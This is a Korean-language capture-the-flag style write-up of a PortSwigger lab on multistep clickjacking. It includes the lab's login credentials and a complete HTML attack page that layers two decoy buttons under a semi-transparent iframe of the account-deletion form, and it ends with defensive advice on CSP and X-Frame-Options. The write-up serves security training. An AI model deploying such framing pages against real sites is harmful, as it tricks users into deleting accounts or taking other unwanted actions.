# 🚩Lab: Multistep clickjacking
```text
This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking.
To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions.
You will need to use two elements for this lab.

You can log in to the account yourself using the following credentials: wiener:peter
```

### 🔍 분석 및 공격 과정
1. wiener:peter로 로그인해본다.
2. delete account를 눌러보자. Are you Sure? 라는 다시 의사를 확인하고 있다.
3. victim으로 하여금 delete account를 유도할려면 서로 다른 위치의 클릭 두 번을 유도해야 한다는 뜻이다.
4. 이 랩에서는 `Click me first`, `Click me next` 라는 텍스트를 주어 순서를 지정할 수 있다.
5. 이전의 랩들과 다른 점은 그저 decoy 요소가 두 개 있어야 한다는거다.
6. 바로 공격자 서버로 이동해 decoy요소와 타겟 버튼이 겹치도록 위치를 수정해가며 스크립트를 작성해보자. 
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <style>
      .container{
        position: relative;
        width: 800px;
        height: 1280px;
      }
      .decoy_first{
        position: absolute;
        top: 480px;
        left: 20px;
        z-index: 1;
      }
      .decoy_second{
        position: absolute;
        top: 280px;
        left: 190px;
        z-index: 1;
      }
      .target{
        position: absolute;
        width: 100%;
        height: 100%;
        z-index: 2;
        opacity: 0.5;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="decoy_first">Click me first</div>
      <div class="decoy_second">Click me next</div>
      <iframe class="target" src="https://0aeb00b704ac87928046033500450024.web-security-academy.net/my-account#delete-account-form"></iframe>
    </div>
  </body>
</html>
```

### 💡 취약점 원리
  클릭재킹에 대한 방어가 전혀 없다. CSP와 X-Frame-Options의 결합으로 안전한 클릭재킹 방어를 구현해야 한다.
